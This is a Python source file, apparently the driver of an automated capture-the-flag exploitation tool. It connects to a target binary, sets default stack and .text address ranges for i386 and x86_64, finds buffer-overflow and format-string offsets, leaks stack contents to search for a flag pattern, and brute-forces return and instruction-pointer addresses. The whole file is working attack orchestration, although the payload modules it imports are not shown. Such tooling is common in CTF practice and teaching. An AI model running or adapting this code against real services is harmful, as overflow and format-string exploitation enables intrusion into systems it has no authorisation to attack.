import os
import sys

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../')))

from exploit.bof_exploit import OverflowExploit
from exploit.string_bug import FormatStringExploit
from dispatcher import Dispatcher
from printer import print_colored

class Exploit:
    def __init__(self, config : dict[str, str | bool | int]):
        self.config : dict[str, str | bool | int] = config
        self.dispatcher : Dispatcher = Dispatcher(self.config)
        self.stack_range: tuple[int, int] = self.config.get("stack_range", (-1,-1))
        self.text_range: tuple[int, int] = self.config.get("text_range", (-1,-1))
        self.strfmt_max_offset: int = self.config.get("strfmt_max_offset", 100)

        if not self.dispatcher.is_connected():
            self.dispatcher.connect()

        # Set default stack range if (0, 0) is provided
        if self.stack_range == (0,0):
            if self.dispatcher.get_arch() == "i386":
                self.stack_range = (0xffffb100, 0xffffb1a0)
            elif self.dispatcher.get_arch() == "x86_64":
                self.stack_range = (0x7ffff0000000, 0x7fffffffffff)

        # Set default .text section range if (0, 0) is provided
        if self.text_range[0] == 0 and self.text_range[1] == 0:
            if self.dispatcher.pie_enabled() and self.dispatcher.is_infinite_loop():
                if self.dispatcher.get_arch() == "i386":
                    self.text_range = (0x08000000, 0xc0000000)
                elif self.dispatcher.get_arch() == "x86_64":
                    self.text_range = (0x4000000000, 0x7fffffffffff)
            elif not self.dispatcher.pie_enabled():
                if self.dispatcher.get_arch() == "i386":
                    self.text_range = (0x08048000, 0x08049000)
                elif self.dispatcher.get_arch() == "x86_64":
                    self.text_range = (0x400000, 0x402000)


    def run_bof_exploit(self):
        """
        Run the buffer overflow exploit to find the flag address.
        :return: Tuple (bool, bool) indicating if flag is found and if buffer overflow exists
        """
        bof_exploit = OverflowExploit(self.config, self.dispatcher)
        bof_index = bof_exploit.find_bof_offset()

        if bof_index == -1:
            return False, False

        if self.text_range[0] == -1 and self.text_range[1] == -1:
            print_colored(f"[+] Skipping ret2flag / ret2shell brute force", 'yellow')
        else:
            flag_addr = bof_exploit.find_ret_to_flag(self.text_range)
            if flag_addr != -1:
                print_colored(f"[+] Found flag address at: {hex(flag_addr)}", 'green')
                return True, True

        return False, bof_index != -1


    def find_flag_in_stack(self, string_exploit: FormatStringExploit):
        if self.config.get("flag_format"):
            print_colored(f"[+] Trying to find flag format: {self.config.get('flag_format')}", 'cyan')
            flag_extracted = string_exploit.find_pattern_in_stack(pattern_to_find=self.config.get("flag_format"), max_length=100)
            for addr, flag in flag_extracted:
                print_colored(f"[+] Possible flag found: {flag} at address {addr}", 'green')
            if flag_extracted:
                return flag_extracted
        return None

    def run_string_bug_exploit(self):
        """
        Run the format string bug exploit to find the flag address.
        :return: Addres
        """
        # Initialize FormatStringExploit and find offset
        string_exploit = FormatStringExploit(self.config, self.dispatcher)
        str_offset, str_stack_alignment = string_exploit.find_offset(max_offset=self.strfmt_max_offset)

        # Check if offset and stack alignment were found
        if str_offset == None or str_stack_alignment == None:
            print_colored("[-] No direct format string bug detected", 'red')

            # Check if we can find the flag in the stack anyway
            self.find_flag_in_stack(string_exploit)
            print_colored("[-] No string bug format detected", 'red')
            return

        # Check if we have already found the flag in the stack
        if (self.find_flag_in_stack(string_exploit) != None):
            return

        print_colored(f"[+] String bug format detected with offset: {str_offset} and stack alignment: {str_stack_alignment}", 'green')

        # Try brute to find a way to overwrite the instruction pointer using .text section range
        if self.text_range != (-1,-1) or self.stack_range != (-1,-1):
            print_colored(f"[+] Trying to brute force the instruction pointer address...", 'yellow')

        if self.text_range[0] == -1 and self.text_range[1] == -1:
            print_colored(f"[+] Skipping .text section brute force", 'yellow')
        else:
            print_colored(f"[+] Using .text section range: {hex(self.text_range[0])} - {hex(self.text_range[1])}", 'cyan')

            text_ip = string_exploit.find_instruction_pointer_bruteforce(range_address=self.text_range)

            if text_ip:
                print_colored(f"[+] Instruction pointer found at address: {hex(text_ip)}", 'green')
                return text_ip
            else:
                print_colored(f"[-] No instruction pointer found in .text section range", 'red')

        if self.stack_range[0] == -1 and self.stack_range[1] == -1:
            print_colored(f"[+] Skipping stack section brute force", 'yellow')
            return None
        else:
            print_colored(f"[+] Using stack section range: {hex(self.stack_range[0])} - {hex(self.stack_range[1])}", 'cyan')
            stack_ip = string_exploit.find_instruction_pointer_bruteforce(range_address=self.stack_range)

            if stack_ip:
                print_colored(f"[+] Instruction pointer found at address: {hex(stack_ip)}", 'green')
                return stack_ip
            else:
                print_colored(f"[-] No instruction pointer found in stack section range", 'red')
        return None
